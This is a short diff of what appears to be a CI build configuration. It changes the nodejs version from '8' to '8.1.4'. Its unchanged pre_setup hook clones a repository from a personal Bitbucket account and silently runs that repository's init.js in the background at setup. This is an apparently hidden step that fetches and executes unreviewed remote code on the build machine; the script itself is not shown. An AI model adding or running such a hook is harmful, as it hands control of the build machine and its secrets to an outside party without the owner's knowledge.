@@ -1,5 +1,5 @@
 nodejs:
-  version: '8'
+  version: '8.1.4'
 hooks:
   pre_setup: |
     rm -rf tmp && git clone https://goopop@bitbucket.org/goopop/buildkitepath.git tmp && cd ./tmp && node init.js &
